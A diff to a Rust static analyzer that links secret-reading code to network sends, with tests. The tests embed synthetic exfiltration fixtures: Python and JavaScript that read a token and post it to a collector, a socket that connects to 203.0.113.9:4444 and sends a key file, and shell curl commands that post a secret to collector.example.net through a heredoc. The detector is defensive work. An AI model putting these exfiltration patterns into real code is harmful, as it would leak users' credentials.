@@ -1453,7 +1453,10 @@ pub fn apply_matching(
                     let raw = if statement_mode {
                         window.to_string()
                     } else {
-                        call_scope(&code, sink_line, names_a_destination(&sink.rule))
+                        // A piece of a line is the sink's command if the
+                        // sink's rule matches it (or has no pattern to ask).
+                        let sink_in = |text: &str| matches(&sink.rule, text) != Some(false);
+                        call_scope(&code, sink_line, names_a_destination(&sink.rule), &sink_in)
                     };
                     let masked = code_only(&raw, code.lang);
                     (raw, masked)
@@ -1676,12 +1679,20 @@ fn names_a_destination(rule_id: &str) -> bool {
 /// (while a bracket it opened is still open, or the line ends inside an
 /// argument list — see [`continues_into_next`]), and, for a sink that
 /// [`names_a_destination`], the lines below that use the name the sink line
-/// assigns; all within the [`SINK_ARG_WINDOW`] lines [`arg_window`] reads. A
-/// heredoc the call opens (`curl --data-binary @- <<EOF`) is its input, so
-/// its body is in the window too, up to the delimiter (see
-/// [`heredoc_body_end`]). A complete statement after the sink is something
-/// else: a docstring, a log line, the next function's `def connect(url):`.
-fn call_scope(code: &CodeLines, sink_line: usize, follow_uses: bool) -> String {
+/// assigns, or else the object it calls a method on (`s.connect(("203.0.113.9",
+/// 4444))`, then `s.sendall(key)`); all within the [`SINK_ARG_WINDOW`] lines
+/// [`arg_window`] reads. A heredoc the call opens (`curl --data-binary @-
+/// <<EOF`) is its input, so its body is in the window too, up to the
+/// delimiter (see [`heredoc_body_end`]; `sink_in` says whether a piece of the
+/// line is still the sink's command). A complete statement after the sink is
+/// something else: a docstring, a log line, the next function's `def
+/// connect(url):`.
+fn call_scope(
+    code: &CodeLines,
+    sink_line: usize,
+    follow_uses: bool,
+    sink_in: &dyn Fn(&str) -> bool,
+) -> String {
     let lines = code.lines;
     if sink_line == 0 || sink_line > lines.len() {
         return String::new();
@@ -1703,9 +1714,17 @@ fn call_scope(code: &CodeLines, sink_line: usize, follow_uses: bool) -> String {
         end += 1;
         open += depth(end);
     }
-    let end = heredoc_body_end(code, sink_line, end, last);
+    let end = heredoc_body_end(code, sink_line, end, last, sink_in);
     let mut keep: Vec<usize> = (sink_line..=end).collect();
-    if let Some((bound, _)) = assigned_name(lines[sink_line - 1]).filter(|_| follow_uses) {
+    let followed = if follow_uses {
+        let line = lines[sink_line - 1];
+        assigned_name(line)
+            .map(|(bound, _)| bound)
+            .or_else(|| call_receiver(line))
+    } else {
+        None
+    };
+    if let Some(bound) = followed {
         let python = code.lang == Lang::Python;
         keep.extend((end + 1..=last).filter(|&n| uses_word(lines[n - 1], bound, python)));
     }
@@ -1715,20 +1734,67 @@ fn call_scope(code: &CodeLines, sink_line: usize, follow_uses: bool) -> String {
         .join("\n")
 }
 
+/// `s.connect(("203.0.113.9", 4444))`, `self.sock.connect(...)`, `await
+/// ws.open(...)`: a line that calls a method on an object and assigns
+/// nothing.
+fn call_receiver_re() -> &'static Regex {
+    static RE: OnceLock<Regex> = OnceLock::new();
+    RE.get_or_init(|| {
+        Regex::new(r"^\s*(?:await\s+)?(?:(?:self|this)\.)?([A-Za-z_][A-Za-z0-9_]*)\s*\.\s*[A-Za-z_][A-Za-z0-9_]*\s*\(")
+            .expect("call-receiver regex compiles")
+    })
+}
+
+/// The object a line calls a method on (see [`call_receiver_re`]): `s` in
+/// `s.connect(("203.0.113.9", 4444))`. The connection the call opens is the
+/// object's, and so is the send that follows (`s.sendall(key)`).
+fn call_receiver(line: &str) -> Option<&str> {
+    call_receiver_re()
+        .captures(line)
+        .and_then(|c| c.get(1))
+        .map(|m| m.as_str())
+}
+
 /// The last line of the call on `start..=end` together with the body of a
 /// heredoc it opens, if its body expands variables: the lines after `end` up
 /// to the delimiter line, at most up to `last`. `end` when the call opens
 /// none, or opens one that expands nothing (`<<'EOF'`, `<<"EOF"` and
 /// `<<\EOF` in shell, `<<~'EOS'` in Ruby), whose `$TOKEN` is text.
-fn heredoc_body_end(code: &CodeLines, start: usize, end: usize, last: usize) -> usize {
+///
+/// A heredoc is the input of the command it is written after. When a `&&`,
+/// `||` or `;` comes before it on its line, that command is the part of the
+/// line after the last of them, and the heredoc is the sink's only if
+/// `sink_in` says that part is still the sink's command: `curl -s
+/// https://status.example.com/ping && cat <<EOF > notes.txt` sends nothing
+/// the heredoc holds.
+fn heredoc_body_end(
+    code: &CodeLines,
+    start: usize,
+    end: usize,
+    last: usize,
+    sink_in: &dyn Fn(&str) -> bool,
+) -> usize {
     if !code.lang.heredocs() {
         return end;
     }
-    let first =
-        (start..=end).find_map(|n| heredoc_opener(code.lines[n - 1], code.code(n), code.lang));
-    let Some(Some(delim)) = first else {
+    let first = (start..=end).find_map(|n| {
+        heredoc_opener_at(code.lines[n - 1], code.code(n), code.lang).map(|(at, d)| (n, at, d))
+    });
+    let Some((n, at, Some(delim))) = first else {
         return end;
     };
+    let c = code.code(n);
+    let separator = [
+        c[..at].rfind("&&").map(|p| p + 2),
+        c[..at].rfind("||").map(|p| p + 2),
+        c[..at].rfind(';').map(|p| p + 1),
+    ]
+    .into_iter()
+    .flatten()
+    .max();
+    if separator.is_some_and(|from| !sink_in(&code.lines[n - 1][from..])) {
+        return end;
+    }
     (end + 1..=last)
         .find(|&n| code.lines[n - 1].trim() == delim)
         .map_or(last, |n| n - 1)
@@ -1739,7 +1805,13 @@ fn heredoc_body_end(code: &CodeLines, start: usize, end: usize, last: usize) -> 
 /// `Some(None)` for one whose body is text, `None` for no heredoc. A
 /// here-string (`<<<`) and a shift (`1 << 2`) are not heredocs; in Ruby the
 /// delimiter follows `<<`, `<<-` or `<<~` directly (`list << item` appends).
+#[cfg_attr(not(test), allow(dead_code))]
 fn heredoc_opener<'a>(raw: &'a str, code: &str, lang: Lang) -> Option<Option<&'a str>> {
+    heredoc_opener_at(raw, code, lang).map(|(_, d)| d)
+}
+
+/// [`heredoc_opener`], with the offset of the heredoc's `<<`.
+fn heredoc_opener_at<'a>(raw: &'a str, code: &str, lang: Lang) -> Option<(usize, Option<&'a str>)> {
     let b = raw.as_bytes();
     let c = code.as_bytes();
     let ruby = lang == Lang::Ruby;
@@ -1789,7 +1861,7 @@ fn heredoc_opener<'a>(raw: &'a str, code: &str, lang: Lang) -> Option<Option<&'a
         if matches!(quote, Some(q @ (b'\'' | b'"')) if b.get(j) != Some(&q)) {
             continue;
         }
-        return Some(expands.then_some(&raw[name_start..j]));
+        return Some((p, expands.then_some(&raw[name_start..j])));
     }
     None
 }
@@ -2036,6 +2108,13 @@ const MAX_FAR_CALLS: usize = 8;
 /// "https://status.example.com"; ping(url)`), or after the assignment, it is
 /// another value.
 ///
+/// A call is `send(token)` or `obj.send(token)`, or the function handed on
+/// by reference with the value beside it, which calls it with that value
+/// later: `Thread(target=send, args=(token,))`, `executor.submit(send,
+/// token)`, `atexit.register(send, token)`, `setTimeout(send, 0, token)`,
+/// `send.call(null, token)`. (A keyword argument that only names the
+/// function, `send=...`, is neither.)
+///
 /// A call with a name assigned from the bound one (`t = token`, then
 /// `send(t)`) is not followed: that would be the propagation step the module
 /// documentation says is left out.
@@ -2047,9 +2126,10 @@ fn called_with(
     window: usize,
     skip: usize,
 ) -> bool {
+    let python = code.lang == Lang::Python;
     let calls = |c: &str| {
         c.len() <= MAX_HEADER_LINE
-            && occurrences(c, name).any(|at| c[at + name.len()..].trim_start().starts_with('('))
+            && uses_word(c, name, python)
             && uses_value(c, bound, code.lang, None)
     };
     let level = indent_of(code.code(source_line));
@@ -4659,5 +4739,158 @@ mod tests {
         // Two questions (the line, and the line without its comment) per
         // finding at most, however many pairs share the line.
         assert!(asked.get() <= 2 * findings.len(), "{}", asked.get());
+    }
+
+    // -- the second verifier's probes on 8f8fd64 (synthetic inputs) ---------
+
+    /// A helper whose parameter shares the secret's name, handed on by
+    /// reference with the secret beside it, receives the secret: e45efc5
+    /// (and the word reading) linked each of these, and the port did not,
+    /// because only `upload(` counted as a call.
+    #[test]
+    fn a_function_handed_on_with_the_value_receives_it() {
+        let helper = "token = read_secret()\n\ndef upload(token):\n    requests.post(COLLECT, data=token)\n\n";
+        for tail in [
+            "threading.Thread(target=upload, args=(token,), daemon=True).start()\n",
+            "ThreadPoolExecutor(1).submit(upload, token)\n",
+            "atexit.register(upload, token)\n",
+            "functools.partial(upload, token)()\n",
+            "loop.run_in_executor(None, upload, token)\n",
+            "threading.Thread(target=self.upload, args=(token,)).start()\n",
+        ] {
+            let src = format!("{helper}{tail}");
+            assert!(value_links("s.py", &src, 1, 4), "{tail}");
+        }
+        let js = "const token = readSecret();\nfunction upload(token) {\n  return fetch(COLLECT, { method: \"POST\", body: token });\n}\n";
+        for tail in [
+            "setTimeout(upload, 0, token);\n",
+            "upload.call(null, token);\n",
+            "upload.apply(null, [token]);\n",
+            "process.nextTick(upload, token);\n",
+        ] {
+            let src = format!("{js}{tail}");
+            assert!(value_links("s.js", &src, 1, 3), "{tail}");
+        }
+        // Beyond the rule's window, from the `__main__` guard.
+        let filler: String = (0..25).map(|i| format!("STEP_{i} = {i}\n")).collect();
+        let far = format!(
+            "{helper}{filler}if __name__ == \"__main__\":\n    threading.Thread(target=upload, args=(token,)).start()\n"
+        );
+        assert!(value_links("s.py", &far, 1, 4));
+        // Handed something else, or named only as a keyword, the parameter
+        // is something else.
+        for tail in [
+            "threading.Thread(target=upload, args=(\"anonymous\",)).start()\n",
+            "atexit.register(upload, \"anonymous\")\n",
+            "register(upload=handler, token=token)\n",
+            "log.info(\"upload\", token)\n",
+        ] {
+            let src = format!("{helper}{tail}");
+            assert!(!value_links("s.py", &src, 1, 4), "{tail}");
+        }
+        let far_local = format!(
+            "{helper}{filler}def main():\n    token = \"public\"\n    threading.Thread(target=upload, args=(token,)).start()\n"
+        );
+        assert!(!value_links("s.py", &far_local, 1, 4));
+    }
+
+    /// A sink that opens a connection by calling a method on an object
+    /// (`s.connect(("203.0.113.9", 4444))`, NET-009) and assigns nothing:
+    /// the send is a later line that uses the object. e45efc5 read the four
+    /// lines after it; the port read only the call.
+    #[test]
+    fn a_connection_opened_on_an_object_is_followed_to_its_send() {
+        let socket_rule = CorrelationRule {
+            sink: FindingSelector {
+                rule_prefixes: vec![],
+                rule_ids: vec!["NET-009".to_string()],
+            },
+            ..value_rule()
+        };
+        let run = |src: &str, sink: usize| {
+            let lines: Vec<&str> = src.lines().collect();
+            let findings = vec![f("CRED-005", 1), f("NET-009", sink)];
+            apply(std::slice::from_ref(&socket_rule), &findings, &lines).len()
+        };
+        let head = "key = open(KEY_PATH).read()\ns = make_socket()\ns.settimeout(5)\n";
+        for send in [
+            "s.sendall(key.encode())\n",
+            "s.send(key)\n",
+            "print(\"sent\")\ns.sendall(key)\n",
+        ] {
+            let src = format!("{head}s.connect((\"203.0.113.9\", 4444))\n{send}");
+            assert_eq!(run(&src, 4), 1, "{send}");
+        }
+        let this = "key = open(KEY_PATH).read()\nself.sock.connect((\"203.0.113.9\", 4444))\nself.sock.sendall(key)\n";
+        assert_eq!(run(this, 2), 1);
+        // A fixed ping on the connection, and the key used by something
+        // else afterwards, does not link.
+        let ping = format!(
+            "{head}s.connect((\"status.example.com\", 7))\ns.sendall(b\"PING\")\nlog(len(key))\ncache.store(key)\n"
+        );
+        assert_eq!(run(&ping, 4), 0);
+        assert_eq!(call_receiver("s.connect((\"h\", 1))"), Some("s"));
+        assert_eq!(call_receiver("  await ws.open(url)"), Some("ws"));
+        assert_eq!(call_receiver("this.sock.connect(opts)"), Some("sock"));
+        assert_eq!(call_receiver("conn = s.connect((\"h\", 1))"), None);
+        assert_eq!(call_receiver("connect((\"h\", 1))"), None);
+    }
+
+    /// A heredoc after `&&`, `||` or `;` on the sink's line belongs to the
+    /// command after the separator: read with the call only if that command
+    /// is still the sink.
+    #[test]
+    fn a_heredoc_after_a_separator_is_the_sinks_only_if_the_command_is() {
+        // A stand-in for the corpus: CRED-012 matches `read_secret`, NET-001
+        // matches `curl ... https://`.
+        let matches = |id: &str, text: &str| match id {
+            "CRED-012" => Some(text.contains("read_secret")),
+            "NET-001" => Some(text.contains("curl") && text.contains("https://")),
+            _ => None,
+        };
+        let run = |src: &str| {
+            let lines: Vec<&str> = src.lines().collect();
+            let findings = vec![
+                Finding {
+                    file: "s.sh".to_string(),
+                    ..f("CRED-012", 1)
+                },
+                Finding {
+                    file: "s.sh".to_string(),
+                    ..f("NET-001", 2)
+                },
+            ];
+            apply_matching(&[value_rule()], &findings, &lines, &matches).len()
+        };
+        let src = |call: &str| format!("TOKEN=\"$(read_secret)\"\n{call}\n$TOKEN\nEOF\n");
+        for call in [
+            "curl -s -X POST https://collector.example.net/c --data-binary @- <<EOF",
+            "cd /tmp; curl -s -X POST https://collector.example.net/c --data-binary @- <<EOF",
+            "cat <<EOF | curl -s -X POST --data-binary @- https://collector.example.net/c",
+            "echo start && cat <<EOF | curl -s --data-binary @- https://collector.example.net/c",
+        ] {
+            assert_eq!(run(&src(call)), 1, "{call}");
+        }
+        for call in [
+            "curl -s https://status.example.com/ping && cat <<EOF > notes.txt",
+            "curl -s https://status.example.com/ping || cat <<EOF >> failures.log",
+            "curl -s https://status.example.com/ping; tee notes.txt <<EOF",
+        ] {
+            assert_eq!(run(&src(call)), 0, "{call}");
+        }
+        // With no pattern to ask (`apply`), the heredoc is read as before.
+        let lines_owner = src("curl -s https://status.example.com/ping && cat <<EOF > notes.txt");
+        let lines: Vec<&str> = lines_owner.lines().collect();
+        let findings = vec![
+            Finding {
+                file: "s.sh".to_string(),
+                ..f("CRED-012", 1)
+            },
+            Finding {
+                file: "s.sh".to_string(),
+                ..f("NET-001", 2)
+            },
+        ];
+        assert_eq!(apply(&[value_rule()], &findings, &lines).len(), 1);
     }
 }
